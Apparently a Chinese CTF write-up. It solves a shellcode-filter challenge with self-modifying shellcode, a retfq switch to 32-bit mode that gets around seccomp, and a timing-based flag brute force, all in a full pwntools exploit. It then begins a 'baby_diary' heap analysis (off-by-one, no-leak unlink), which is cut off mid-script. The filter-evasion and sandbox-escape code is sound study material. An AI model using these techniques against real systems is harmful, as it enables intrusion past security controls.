<p><strong>入侵思路</strong></p>
<p>程序对输入的 shellcode 有检查，建议用 nasm 手动编写 shellcode</p>
<p>可以利用 shellcode 创造一个 sys_read 绕过 shellcode 的检查，但在实际构造的过程中遇到了很多问题，最大的问题但就是无法使用 syscall（类似于 mov，add 之类的指令也会被过滤掉）</p>
<p>后来调试网上的 wp 发现了解决的办法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">append = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push rdx</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_read = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /*read(0,0x40404040,0x70)*/</span></span><br><span class="line"><span class="string">    push 0x40404040</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string">    push 0x40</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x40</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor al,0x40</span></span><br><span class="line"><span class="string">    push 0x70</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    push 0x5d</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor byte ptr[rax+0x57],cl</span></span><br><span class="line"><span class="string">    push 0x5f</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor byte ptr[rax+0x58],cl</span></span><br><span class="line"><span class="string">    push rdx</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x70</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;&quot;</span></span><br><span class="line">shellcode += shellcode_read</span><br><span class="line">shellcode += append</span><br><span class="line">shellcode = asm(shellcode,arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>直接输入 syscall 会被检测出来，但通过 <code>xor byte ptr[rax+offset],cl</code> 就可以将后面的二进制代码给计算为 syscall</li>
<li>对于这种会检查 shellcode 的程序来说，破解的关键点就是要利用合适的汇编指令来修改 shellcode 本身</li>
</ul>
<p>利用这个技巧可以获取到 syscall，但由于程序没法泄露，因此先执行 sys_mmap 申请一段固定位置的缓冲区，然后执行 sys_read 将数据写入其中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7f6fba0ee031</span>    syscall  &lt;SYS_mmap&gt;</span><br><span class="line">       addr: <span class="number">0x40404040</span></span><br><span class="line">       len: <span class="number">0x7e</span></span><br><span class="line">       prot: <span class="number">0x7</span></span><br><span class="line">       flags: <span class="number">0x22</span></span><br><span class="line">       fd: <span class="number">0x0</span> (pipe:[<span class="number">270462</span>])</span><br><span class="line">       offset: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7f6fba0ee057</span>    syscall  &lt;SYS_read&gt;</span><br><span class="line">       fd: <span class="number">0x0</span> (pipe:[<span class="number">270462</span>])</span><br><span class="line">       buf: <span class="number">0x40404040</span> ◂— <span class="number">0</span></span><br><span class="line">       nbytes: <span class="number">0x70</span></span><br></pre></td></tr></table></figure>
<p>最后的步骤就是 retfq 切换32位架构来绕过 seccomp 了</p>
<ul>
<li>指令 retfq 有两步操作：pop ip，pop cs（retf 是32位的 pop，retfq 是64位的 pop）<ul>
<li>cs=0x23 程序以32位模式运行</li>
<li>cs=0x33 程序以64位模式运行 </li>
</ul>
</li>
</ul>
<p>只要按照如下方法步骤 shellcode 就可以完成切换：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">shellcode_retfq = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    xor al,0x40</span></span><br><span class="line"><span class="string">    push 0x72</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor byte ptr[rax+0x40],cl</span></span><br><span class="line"><span class="string">    push 0x68</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor byte ptr[rax+0x40],cl</span></span><br><span class="line"><span class="string">    push 0x47</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    sub byte ptr[rax+0x41],cl</span></span><br><span class="line"><span class="string">    push 0x48</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    sub byte ptr[rax+0x41],cl</span></span><br><span class="line"><span class="string">    push rdi</span></span><br><span class="line"><span class="string">    push rdi</span></span><br><span class="line"><span class="string">    push 0x23</span></span><br><span class="line"><span class="string">    push 0x40404040</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>正常写入的 retfq 指令会被程序过滤，但还是可以通过 <code>sub byte ptr[rax+offset],cl</code> 进行调整</li>
</ul>
<p>在绕过 seccomp 后还是会因为没有 wrire 而打印不出 flag，因此只能通过 cmp 汇编指令来区别内存中的 flag，将 flag 爆破出来（类似于 SCTF-gadget 的思路）</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./shellcode&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *0x40026D\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line">append = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push rdx</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_mmap = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /*mmap(0x40404040,0x7e,7,34,0,0)*/</span></span><br><span class="line"><span class="string">    push 0x40404040 /*set rdi*/</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    push 0x7e /*set rsi*/</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string">    push 0x40 /*set rdx*/</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x47</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    push 0x40 /*set r8*/</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x40</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop r8</span></span><br><span class="line"><span class="string">    push rax /*set r9*/</span></span><br><span class="line"><span class="string">    pop r9</span></span><br><span class="line"><span class="string">    /*syscall*/</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    push 0x5d</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor byte ptr[rax+0x31],cl</span></span><br><span class="line"><span class="string">    push 0x5f</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor byte ptr[rax+0x32],cl</span></span><br><span class="line"><span class="string">    push 0x22 /*set rcx*/</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    push 0x40/*set rax*/</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x49</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_read = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /*read(0,0x40404040,0x70)*/</span></span><br><span class="line"><span class="string">    push 0x40404040</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string">    push 0x40</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x40</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor al,0x40</span></span><br><span class="line"><span class="string">    push 0x70</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    push 0x5d</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor byte ptr[rax+0x57],cl</span></span><br><span class="line"><span class="string">    push 0x5f</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor byte ptr[rax+0x58],cl</span></span><br><span class="line"><span class="string">    push rdx</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x70</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_retfq = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    xor al,0x40</span></span><br><span class="line"><span class="string">    push 0x72</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor byte ptr[rax+0x40],cl</span></span><br><span class="line"><span class="string">    push 0x68</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor byte ptr[rax+0x40],cl</span></span><br><span class="line"><span class="string">    push 0x47</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    sub byte ptr[rax+0x41],cl</span></span><br><span class="line"><span class="string">    push 0x48</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    sub byte ptr[rax+0x41],cl</span></span><br><span class="line"><span class="string">    push rdi</span></span><br><span class="line"><span class="string">    push rdi</span></span><br><span class="line"><span class="string">    push 0x23</span></span><br><span class="line"><span class="string">    push 0x40404040</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">p,index,ch</span>):</span></span><br><span class="line">    shellcode_x86 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        /*fp = open(&quot;flag&quot;)*/</span></span><br><span class="line"><span class="string">        mov esp,0x40404140</span></span><br><span class="line"><span class="string">        push 0x67616c66</span></span><br><span class="line"><span class="string">        push esp</span></span><br><span class="line"><span class="string">        pop ebx</span></span><br><span class="line"><span class="string">        xor ecx,ecx</span></span><br><span class="line"><span class="string">        mov eax,5</span></span><br><span class="line"><span class="string">        int 0x80</span></span><br><span class="line"><span class="string">        mov ecx,eax</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    shellcode_flag = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        push 0x33</span></span><br><span class="line"><span class="string">        push 0x40404089</span></span><br><span class="line"><span class="string">        retfq</span></span><br><span class="line"><span class="string">        /*read(fp,buf,0x70)*/</span></span><br><span class="line"><span class="string">        mov rdi,rcx</span></span><br><span class="line"><span class="string">        mov rsi,rsp</span></span><br><span class="line"><span class="string">        mov rdx,0x70</span></span><br><span class="line"><span class="string">        xor rax,rax</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    shellcode = <span class="string">&quot;&quot;</span></span><br><span class="line">    shellcode += shellcode_mmap</span><br><span class="line">    shellcode += append</span><br><span class="line">    shellcode += shellcode_read</span><br><span class="line">    shellcode += append</span><br><span class="line">    shellcode += shellcode_retfq</span><br><span class="line">    shellcode += append</span><br><span class="line">    shellcode = asm(shellcode,arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    sl(shellcode)</span><br><span class="line">    sleep(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> index == <span class="number">0</span>:</span><br><span class="line">        shellcode_flag+=<span class="string">&quot;cmp byte ptr[rsi+&#123;0&#125;],&#123;1&#125;;jz $-3;ret&quot;</span>.<span class="built_in">format</span>(index,ch)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        shellcode_flag+=<span class="string">&quot;cmp byte ptr[rsi+&#123;0&#125;],&#123;1&#125;;jz $-4;ret&quot;</span>.<span class="built_in">format</span>(index,ch)</span><br><span class="line"></span><br><span class="line">    shellcode_x86 = asm(shellcode_x86,arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">    shellcode_flag = asm(shellcode_flag,arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">    shellcode = shellcode_x86 + <span class="number">0x29</span>*<span class="string">b&#x27;\x90&#x27;</span> + shellcode_flag</span><br><span class="line"></span><br><span class="line">    sl(shellcode)</span><br><span class="line"></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line">a=[]</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>,<span class="number">127</span>):</span><br><span class="line">    local = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        p = process(challenge)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    pwn(p,index,ch)</span><br><span class="line">    start = time.time()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      p.recv(timeout=<span class="number">2</span>)</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> a]))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">pass</span></span><br><span class="line">    end=time.time()</span><br><span class="line">    p.close()</span><br><span class="line">    <span class="keyword">if</span> end-start&gt;<span class="number">1.5</span>:</span><br><span class="line">      a.append(ch)</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> a]))</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> a]))</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  index = index + <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> a]))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="baby-diary"><a href="#baby-diary" class="headerlink" title="baby_diary"></a>baby_diary</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">baby_diary: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">664b</span>d170fa1869d1e8bae262af76385c91c3e97d, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.2</span>)</span> stable release version 2.31.</span></span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<p>整数溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk_list[i] = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(size + <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<p>负数溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index = input();</span><br><span class="line"><span class="keyword">if</span> ( check(index) )</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;content: %s\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)chunk_list[index]);</span><br></pre></td></tr></table></figure>
<p>有 off-by-one 漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chunk = chunk_list[index];</span><br><span class="line">size_list[index] = len;</span><br><span class="line"><span class="keyword">if</span> ( len )</span><br><span class="line">  chunk[len + <span class="number">1</span>] = (chunk[len + <span class="number">1</span>] &amp; <span class="number">0xF0</span>) + code2(index);</span><br></pre></td></tr></table></figure>
<ul>
<li>可以控制 <code>chunk[len + 1]</code> 为 <code>0x0-0xf</code></li>
</ul>
<p><strong>入侵思路</strong></p>
<p>本题目的核心点就是无泄露 unlink，对于所有的无泄漏 unlink 都可以考虑如下的堆风水：</p>
<ul>
<li>获取两个 unsorted chunk 进行合并，其中的第二个 chunk 末地址必须为 <code>\x00</code>（遗留下 FD BK 指针）</li>
<li>重新申请大 unsorted chunk 后释放（不破坏原来的 heap 结构），然后再次进行分割，使第二个 chunk 的末尾地址为 <code>\x30</code> 或者 <code>\x40</code> <code>\x50</code> 等等（有一定偏移的地址都可以）</li>
<li>之后利用 unsortedbin 进行调整，在 FD-&gt;bk 和 BK-&gt;fd 中写入 <code>\x30</code>，然后覆盖为 <code>\x00</code></li>
</ul>
<p>不过本题目有点特殊，在具体的堆风水在构建时需要作出微调，可以参考如下的泄露脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x418</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x210</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x428</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x438</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x378</span>,<span class="string">&quot;8&quot;</span>*<span class="number">0x10</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x428</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x208</span>) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">dele(<span 